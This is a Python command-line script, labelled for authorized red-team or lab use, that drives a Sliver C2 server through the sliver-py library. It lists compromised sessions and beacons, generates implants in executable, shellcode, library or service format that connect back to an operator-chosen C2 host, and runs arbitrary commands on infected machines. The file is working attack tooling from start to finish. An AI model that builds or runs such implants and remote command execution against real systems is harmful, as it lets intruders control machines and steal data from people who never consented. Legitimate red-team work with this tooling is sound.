#!/usr/bin/env python3
"""
Sliver C2 operator automation helper.

Uses the official `sliver-py` gRPC client library (multiplayer / mTLS) to
automate operator interactions with a running Sliver server:

  * list active sessions and beacons
  * list running C2 listener jobs
  * generate an implant build (mTLS/HTTP/DNS)
  * run a single command inside an interactive session and print output

Authorized red-team / lab use only.

Install:
    pip install sliver-py        # for Sliver server v1.5.29+
Requires a Sliver operator config (created with `new-operator ... --save FILE`).

Docs: https://github.com/moloch--/sliver-py
"""

import argparse
import asyncio
import os
import sys

try:
    from sliver import SliverClientConfig, SliverClient
    from sliver import client_pb2
except ImportError:
    sys.stderr.write(
        "[!] sliver-py is not installed. Run: pip install sliver-py\n"
    )
    sys.exit(1)


async def connect(config_path):
    """Parse an operator config and return a connected SliverClient."""
    if not os.path.isfile(config_path):
        raise FileNotFoundError(f"operator config not found: {config_path}")
    config = SliverClientConfig.parse_config_file(config_path)
    client = SliverClient(config)
    await client.connect()
    return client


async def cmd_sessions(client):
    sessions = await client.sessions()
    if not sessions:
        print("[*] No active sessions.")
        return
    print(f"[*] {len(sessions)} active session(s):")
    for s in sessions:
        print(f"  ID={s.ID}  {s.Name}  user={s.Username}  "
              f"host={s.Hostname}  os={s.OS}/{s.Arch}  remote={s.RemoteAddress}")


async def cmd_beacons(client):
    beacons = await client.beacons()
    if not beacons:
        print("[*] No active beacons.")
        return
    print(f"[*] {len(beacons)} active beacon(s):")
    for b in beacons:
        print(f"  ID={b.ID}  {b.Name}  user={b.Username}  "
              f"host={b.Hostname}  interval={b.Interval}s  jitter={b.Jitter}")


async def cmd_jobs(client):
    jobs = await client.jobs()
    if not jobs:
        print("[*] No running jobs/listeners.")
        return
    print(f"[*] {len(jobs)} job(s):")
    for j in jobs:
        print(f"  ID={j.ID}  {j.Name}  protocol={j.Protocol}  port={j.Port}")


async def cmd_generate(client, host, proto, os_target, arch, fmt, save_dir):
    """Generate an implant build via the server."""
    c2 = client_pb2.ImplantC2(Priority=0, URL=f"{proto}://{host}")
    fmt_map = {
        "exe": client_pb2.OutputFormat.EXECUTABLE,
        "shellcode": client_pb2.OutputFormat.SHELLCODE,
        "shared": client_pb2.OutputFormat.SHARED_LIB,
        "service": client_pb2.OutputFormat.SERVICE,
    }
    config = client_pb2.ImplantConfig(
        GOOS=os_target,
        GOARCH=arch,
        Format=fmt_map.get(fmt, client_pb2.OutputFormat.EXECUTABLE),
        IsBeacon=False,
        C2=[c2],
    )
    print(f"[*] Requesting implant build ({os_target}/{arch}, {fmt}, {proto})...")
    implant = await client.generate_implant(config)
    out_path = os.path.join(save_dir, implant.File.Name)
    with open(out_path, "wb") as fh:
        fh.write(implant.File.Data)
    print(f"[+] Implant written: {out_path} ({len(implant.File.Data)} bytes)")


async def cmd_exec(client, session_id, command):
    """Run a single command inside an interactive session."""
    interact = await client.interact_session(session_id)
    if interact is None:
        print(f"[!] No session with ID {session_id}")
        return
    parts = command.split()
    exe, args = parts[0], parts[1:]
    print(f"[*] execute {command} on session {session_id}")
    result = await interact.execute(exe, args, True)
    if result.Stdout:
        sys.stdout.write(result.Stdout.decode(errors="replace"))
    if result.Stderr:
        sys.stderr.write(result.Stderr.decode(errors="replace"))
    print(f"\n[+] exit status: {result.Status}")


def build_parser():
    p = argparse.ArgumentParser(
        description="Sliver C2 operator automation helper (sliver-py)."
    )
    default_cfg = os.path.join(
        os.path.expanduser("~"), ".sliver-client", "configs", "default.cfg"
    )
    p.add_argument("-c", "--config", default=default_cfg,
                   help="path to operator .cfg (default: %(default)s)")
    sub = p.add_subparsers(dest="action", required=True)

    sub.add_parser("sessions", help="list active sessions")
    sub.add_parser("beacons", help="list active beacons")
    sub.add_parser("jobs", help="list running listener jobs")

    g = sub.add_parser("generate", help="generate an implant build")
    g.add_argument("--host", required=True, help="C2 host[:port]")
    g.add_argument("--proto", default="mtls",
                   choices=["mtls", "http", "https", "dns"])
    g.add_argument("--os", dest="os_target", default="windows",
                   choices=["windows", "linux", "darwin"])
    g.add_argument("--arch", default="amd64",
                   choices=["amd64", "386", "arm64"])
    g.add_argument("--format", dest="fmt", default="exe",
                   choices=["exe", "shellcode", "shared", "service"])
    g.add_argument("--save", default=".", help="output directory")

    e = sub.add_parser("exec", help="run a command in a session")
    e.add_argument("--session", required=True, help="session ID")
    e.add_argument("--command", required=True, help="command line to run")

    return p


async def run(args):
    client = await connect(args.config)
    try:
        if args.action == "sessions":
            await cmd_sessions(client)
        elif args.action == "beacons":
            await cmd_beacons(client)
        elif args.action == "jobs":
            await cmd_jobs(client)
        elif args.action == "generate":
            await cmd_generate(client, args.host, args.proto, args.os_target,
                               args.arch, args.fmt, args.save)
        elif args.action == "exec":
            await cmd_exec(client, args.session, args.command)
    finally:
        # SliverClient uses a long-lived gRPC channel; nothing to close explicitly.
        pass


def main():
    args = build_parser().parse_args()
    try:
        asyncio.run(run(args))
    except FileNotFoundError as exc:
        sys.stderr.write(f"[!] {exc}\n")
        sys.exit(2)
    except Exception as exc:  # noqa: BLE001 - surface gRPC/connection errors clearly
        sys.stderr.write(f"[!] error: {exc}\n")
        sys.exit(1)


if __name__ == "__main__":
    main()
